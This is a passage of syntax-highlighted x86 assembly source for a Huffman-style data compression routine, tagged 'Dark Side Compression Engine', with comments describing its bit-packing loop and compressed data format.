</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">       </span><span class="sc1">; even as mini, for 24 char, it take</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; 1024 caracters :(</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">     </span><span class="sc1">; blah, nobody is perfect...</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; now we concatenate the binary to the</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; now we concatenate the binary to the</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">

</span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">dicotype2</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],-</span><span class="sc2">1</span><span class="sc0">                           </span><span class="sc1">; this to make a stop for</span><span class="sc0">
                                                </span><span class="sc1">; decompressing</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">                           </span><span class="sc1">; set zero to there, reset</span><span class="sc0">
                                                </span><span class="sc1">; values</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc5">compressloop</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">; get current ascii in</span><span class="sc0">
                                                </span><span class="sc1">; data to be compressed</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                                   </span><span class="sc1">; we have to start at zero</span><span class="sc0">
</span><span class="sc5">scannext01</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">scannext01</span><span class="sc0">                              </span><span class="sc1">; loop until we get the value</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; now we concatenate the binary to the</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">              </span><span class="sc1">; buffer, [edi] = the pos of the bit of</span><span class="sc0">
</span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">

</span><span class="sc5">hereweloop</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; [edi-1]</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">thennoneedofimplementation</span><span class="sc0">      </span><span class="sc1">;look if we completed a entire 8 byte</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">; then resent edi</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">; increment it</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">

</span><span class="sc5">thennoneedofimplementation</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; we have to change edi-1</span><span class="sc0">
</span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                           </span><span class="sc1">; and shift it</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                           </span><span class="sc1">; we look if we </span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                         </span><span class="sc1">; need to concatenate one bit</span><span class="sc0">
                                        </span><span class="sc1">; of the three image</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                            </span><span class="sc1">; set to next bye change</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">             </span><span class="sc1">; store it</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                           
</span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc0">                              </span><span class="sc1">; restore the position</span><span class="sc0">

</span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">hereweloop</span><span class="sc0">                      </span><span class="sc1">; and then concatenate ecx eax</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">; then compress all the datas</span><span class="sc0">

</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">compressloop</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                         </span><span class="sc1">; now get size of the compressed</span><span class="sc0">
</span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">                             </span><span class="sc1">; segment</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; The memory is done such like:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Off Size  Description</span><span class="sc0">
</span><span class="sc1">; 0 - byte      068h - (0x68) - Recognizing mark</span><span class="sc0">
</span><span class="sc1">; 1 - word  Original size: Dword</span><span class="sc0">
</span><span class="sc1">; 5 - byte  Number of tree entry</span><span class="sc0">
</span><span class="sc1">; 7 - entries </span><span class="sc0">
</span><span class="sc1">; entry (4bytes) :  - 1 byte: ascii number</span><span class="sc0">
</span><span class="sc1">;           - 2 byte: number of bits</span><span class="sc0">
</span><span class="sc1">;           - 3 word: recognition       </span><span class="sc0">
</span><span class="sc1">; ? - word  0FFFFh - (0xFFFF) - reserved            / bug fix :P</span><span class="sc0">
</span><span class="sc1">; ? - ?     compressed datas                / file size</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">popad</span><span class="sc0">                                           </span><span class="sc1">; return back</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'[DSCEi386]'</span><span class="sc0">            </span><span class="sc1">; Dark Side Compression Engine</span><span class="sc0">

</span><span class="sc4">---</span><span class="sc0">



</span></div></body>
</html>
